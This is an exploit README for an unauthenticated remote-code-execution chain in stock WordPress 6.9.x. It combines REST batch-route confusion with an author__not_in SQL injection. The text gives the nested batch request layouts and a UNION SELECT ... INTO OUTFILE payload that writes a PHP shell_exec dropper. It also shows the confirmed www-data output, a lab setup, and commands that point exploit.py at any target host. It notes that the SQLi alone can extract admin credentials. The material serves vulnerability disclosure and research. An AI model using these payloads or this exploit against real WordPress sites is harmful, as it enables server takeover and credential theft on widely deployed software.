# WordPress 6.9.x anonymous RCE — REST batch-route confusion + `author__not_in` SQLi

Unauthenticated, **no-plugin**, remote-code-execution PoC for WordPress stock core.
GHSA-ff9f-jf42-662q (batch-route confusion) + GHSA-fpp7-x2x2-2mjf (`author__not_in`
SQLi) → RCE. Discovered by Adam Kues (Assetnote / Searchlight Cyber). Fixed in
**6.8.6 / 6.9.5 / 7.0.2**. Full RCE chain affects **6.9.0–6.9.4, 7.0.0–7.0.1**;
the underlying SQLi sink also affects 6.8.0–6.8.5 (fixed 6.8.6).

```
POST /?rest_route=/batch/v1   (anonymous)   →   SQLi   →   INTO OUTFILE   →   id as www-data
```

## Result (stock WP 6.9.4, no plugin)

```
[rce] uid=33(www-data) gid=33(www-data) groups=33(www-data)
[+] RCE CONFIRMED  (anonymous batch-route confusion + author__not_in SQLi -> INTO OUTFILE)
```

## The chain

The two bugs compose. `serve_batch_request_v1()` (class-wp-rest-server.php) builds a
`$matches[]` array of [route,handler] per sub-request, but a sub-request that fails
`wp_parse_url()` (e.g. path `"http://"`) becomes a `parse_path_failed` `WP_Error` that
is pushed to `$requests`/`$validation` **but skipped for `$matches`** — so `$matches`
gets **shifted by one** relative to `$requests`. The dispatch loop then indexes
`$matches[$i]` by the request position, pairing each sub-request with the **wrong**
handler. The fix (6.9.5) appends to `$matches` on the error branch too.

**Stage 1 — batch self-call (method-enum bypass).** Outer batch:
```
[ "http://" ,  POST /wp/v2/posts (body=inner) ,  /batch/v1 ]
```
The shift dispatches the `/wp/v2/posts` sub-request (its own validation passed) onto
the **batch handler** taken from the trailing `/batch/v1` entry → `serve_batch_request_v1()`
runs **recursively** on that sub-request's body. The recursive call is *not* the batch
endpoint's own dispatch, so it never re-runs the `method` enum check — inner sub-requests
may use **GET**. (The 6.9.5 re-entrancy guard on `serve_request`/`rest_api_loaded` is the
related hardening.)

**Stage 2 — route confusion → unsanitized `author_exclude` → SQLi.** Inner batch:
```
[ "http://" ,  POST /wp/v2/categories?author_exclude=<SQLi> ,  GET /wp/v2/posts ]
```
The shift dispatches the `categories` sub-request onto posts `get_items`. `categories`
does **not** register `author_exclude`, so `sanitize_params()` never touches it
(`if ( ! isset($attributes['args'][$key]) ) continue;`) and it flows raw into
`WP_Query::author__not_in` → interpolation into `NOT IN (...)` → SQL injection.

Two details make `INTO OUTFILE` land:
- `categories` is matched via its **create** route (POST), whose args also omit
  `orderby`, so `orderby:false` in the body passes through to `WP_Query`, which
  **blanks the ORDER BY** (otherwise `UNION` + the qualified global `ORDER BY`
  errors). The remaining `LIMIT` is tolerated by `INTO OUTFILE`.
- The dispatched `get_items` happens to select `wp_posts.ID` (1 column), so the
  `UNION SELECT` is single-column.

**Stage 3 — `INTO OUTFILE`.** The injected query writes a benign PHP dropper into
MySQL's `secure_file_priv` dir, which the lab bind-mounts under the webroot; fetching
it over HTTP runs `id` as `www-data`.

```
0) AND 1=0 UNION SELECT '<?php echo "[rce] " . shell_exec("id"); ?>' INTO OUTFILE '/var/lib/mysql-files/oo.php'-- -
```

## Preconditions / scope

- **Anonymous, no plugin, stock WP core.** Confirmed.
- The RCE step (`INTO OUTFILE`) needs the WP MySQL user to hold **FILE** privilege —
  the one environmental precondition (extremely common shared-host / cPanel misconfig
  where the DB user is `GRANT ALL`). `init.sql` grants it for the lab.
- Needs the `secure_file_priv` dir reachable by httpd (the lab bind-mounts it to the
  webroot). On hosts where `INTO OUTFILE` can't write webroot-served paths, the same
  SQLi still enables blind data exfiltration (e.g. admin credential extraction).
- Direct `/wp/v2/posts?author_exclude=<sqli>` is **sanitized (HTTP 400)** — the
  confusion is required.

## Files

```
poc/
  compose.yaml   STOCK target: wordpress:6.9.4 + mysql:8.0 (FILE priv, shared OUTFILE/webroot dir). No plugin.
  init.sql       grants FILE to the WP DB user
  exploit.py     PYTHON exploit: anonymous batch self-call -> SQLi -> INTO OUTFILE -> fetch shell
  run.sh         up + install + exploit   (./run.sh down to tear down)
  rce/           shared dir: MySQL writes here, httpd serves here
```

## Run

```bash
cd poc && ./run.sh            # stock target up + install + anonymous exploit
WP_TARGET=http://host:port python3 exploit.py
```

The dropper runs `id` only — **no shell / no reverse connection**, by design.
